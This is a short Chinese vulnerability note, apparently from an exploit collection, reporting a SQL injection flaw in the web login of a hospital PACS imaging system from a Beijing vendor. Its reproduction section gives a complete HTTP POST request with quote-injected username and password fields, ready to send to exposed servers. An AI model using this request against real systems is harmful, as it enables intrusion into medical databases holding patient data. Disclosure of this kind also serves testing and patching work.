# 北京新网医讯技术有限公司PACS系统web端存在SQL注入漏洞

# 一、漏洞简介
北京新网医讯技术有限公司，公司成立于2000年3月，注册于北京中关村科技园，为国家高新技术企业和中关村高新技术企业（简称为“双高企业”），公司作为软件企业，成为北京软件和信息服务业协会会员。公司专业从事PACS(图像存储与传输系统)和RIS（放射科信息管理系统）的研究、开发工作。北京新网医讯技术有限公司PACS系统web端存在SQL注入漏洞，攻击者可通过该漏洞获取数据库敏感信息。

# 二、影响版本
+ 北京新网医讯技术有限公司PACS系统web端

# 三、特征
![1700663401409-b03afed9-8f5b-4c03-8028-d8bfbc1528cd.png](./img/DB_HHURFak5A5lyG/1700663401409-b03afed9-8f5b-4c03-8028-d8bfbc1528cd-580884.png)

# 四、漏洞复现
```plain
POST / HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 448
Connection: close
Upgrade-Insecure-Requests: 1

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=aIvFnTxaMev%2BMuIasFWPO9198V98WVrTouBNTXTfDdlwXSECHrd5D4RQ6ge5pTRoYihFHyOQ1PfpTf5vaxEjyLRsSb73HPQsKfEOglWjAGo%3D&__EVENTVALIDATION=71o1HhunkN1yKTj5EmZeDoRkcgp5eEkODmWMf4usLX6jNBDWUPDiJBL7MyjboG6J9tKBMrpLafBCb7uKUMvQf5D5fJaarcxn0qfuG00MPr%2FuQJ4dDvXykErSvcEapjM99c2NwAq2u065oiyocPT%2FS%2BV%2BfU0lhZSlV5wDem2SrRLB38wmsXsy5dcVI8zEXxxy&TextName=admin'&TextPwd=admin'&BtnLogin=%E7%99%BB%E5%BD%95
```

![1700663680647-0bf946ca-4a2b-4008-af2e-1f668a183750.png](./img/DB_HHURFak5A5lyG/1700663680647-0bf946ca-4a2b-4008-af2e-1f668a183750-414790.png)



> 更新: 2024-04-16 19:35:04  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/hifk5gfkmueb2136>